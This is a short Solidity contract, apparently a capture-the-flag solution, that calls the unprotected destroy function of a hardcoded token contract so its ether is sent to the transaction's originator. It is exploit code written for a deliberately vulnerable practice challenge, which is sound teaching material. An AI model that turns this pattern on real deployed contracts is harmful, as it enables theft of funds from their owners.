// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface ISimpleToken {
    function destroy(address payable) external;
}

contract RecoveryHack {
    ISimpleToken public simpleToken = ISimpleToken(0x88FAe076204e41de1E5cC8Cf8Daa808e761A0d62);

    function destroy() public {
        simpleToken.destroy(tx.origin);
    }
}
